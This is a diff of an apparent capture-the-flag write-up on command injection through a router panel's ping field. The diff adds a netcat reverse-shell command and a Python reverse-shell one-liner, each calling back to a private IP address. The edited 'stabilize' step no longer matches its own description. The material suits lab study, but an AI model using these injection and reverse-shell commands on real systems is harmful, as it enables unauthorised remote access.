@@ -99,9 +99,13 @@ This technic is about adding '%0A' to operate a line return and executing two di
 
 Here, we've taken advantage of the bad filtering to execute 'ls -la' command after the ping one. And it worked perfectly. Now let's setup a reverse shell.
 
+
+Command to execute to get a rev shell :
+ nc+10.9.0.156+4444+-e+/bin/bash
+
 Now that I have a reverse shell, I stabilized it with python3 :
 
-$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.217",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 www-data@routerpanel:/$
 
 After some reearch, I found a secret '...' folder hidden in /mnt directory.
